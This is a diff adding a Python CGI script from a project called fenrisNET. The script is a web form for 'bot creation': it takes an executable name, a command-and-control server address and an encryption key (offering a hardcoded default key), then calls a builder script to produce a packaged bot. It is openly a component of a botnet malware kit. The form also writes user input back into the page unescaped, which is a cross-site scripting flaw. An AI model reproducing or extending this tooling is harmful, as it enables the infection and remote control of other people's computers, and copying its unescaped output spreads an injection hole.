@@ -1,0 +1,113 @@
+#!/usr/bin/python
+
+########################################################################
+# Copyright 2015 Daniel Haake
+#
+# This file is part of fenrisNET
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+########################################################################
+
+
+import cgi
+import os
+import subprocess
+
+
+arguments = cgi.FieldStorage()
+try:
+    execname = arguments["execname"].value
+except:
+    execname = ""
+try:
+    candc = arguments["candc"].value
+except:
+    candc = ""
+try:
+    encryption = arguments["encryption"].value
+except:
+    encryption = ""
+try:
+    key = arguments["key"].value
+except:
+    key = ""
+
+# HTTP header
+print "Content-Type: text/html"
+print ""
+
+print "<!DOCTYPE html>"
+print "<html>"
+
+# header
+print "<head>"
+print "<title>fenrisNET (bot creation)</title>"
+print "<script>"
+print "function rndFunction() {"
+print "var rndKey = Math.floor(Math.random()*(899999999+1)+100000000)"
+print "document.getElementById(\"enc\").placeholder = rndKey;"
+print "}"
+print "function loadFunction() {"
+print "if (document.getElementById(\"encSelect\").selectedIndex == 2) {"
+print "document.getElementById(\"enc\").placeholder = \"gT8jUdw65h\";"
+print "}"
+print "}"
+print "function selectFunction() {"
+print "if (document.getElementById(\"encSelect\").selectedIndex == 1) {"
+print "document.getElementById(\"enc\").disabled = false;"
+print "document.getElementById(\"enc\").placeholder = \"encryption key\";"
+print "document.getElementById(\"refButton\").style.visibility = \"hidden\""
+print "}"
+print "else {"
+print "document.getElementById(\"enc\").disabled = true;"
+print "if (document.getElementById(\"encSelect\").selectedIndex == 2) {"
+print "document.getElementById(\"enc\").placeholder = \"gT8jUdw65h\";"
+print "document.getElementById(\"refButton\").style.visibility = \"hidden\""
+print "}"
+print "else {"
+print "rndFunction();"
+print "document.getElementById(\"refButton\").style.visibility = \"visible\""
+print "}"
+print "}"
+print "}"
+print "</script>"
+print "</head>"
+
+print "<body onload=\"loadFunction()\">"
+print "<h1>Bot Creation</h1>"
+
+if os.path.isfile("config"):
+    if candc == "" or execname == "" or encryption == "":
+        #print form
+        print "<form method=\"GET\">"
+        print "<input type=\"text\" name=\"execname\" placeholder=\"executable name\" value=\"" + execname + "\"><br />"
+        print "<input type=\"text\" name=\"candc\" placeholder=\"C&C-server\" value=\"" + candc + "\"><br />"
+        print "<p>Generate a random communication encryption key?<br />"
+        print "<select id=\"encSelect\" name=\"encryption\" onchange=\"selectFunction()\">"
+        print "<option value=\"y\">yes</option>"
+        print "<option value=\"n\">no</option>"
+        print "<option value=\"s\" selected>standard key</option>"
+        print "</select>"
+        print "<input type=\"text\" id=\"enc\" name=\"key\" disabled>"
+        print "<input type=\"button\" id=\"refButton\" value=\"generate new key\" style=\"visibility:hidden\" onclick=\"rndFunction()\"><p>"
+        print "<input type=\"submit\">"
+        print "</form>"
+    else:
+	subprocess.call(["./run.py", "-a", execname, candc, key])
+        print "Bot created. Look for " + execname + ".zip " + "inside your fenrisNET folder.<br /><a href=\"index.html\">Menu</a>"
+else:
+    print "Run configuration script first!"
+
+print "</body>"
+print "</html>"
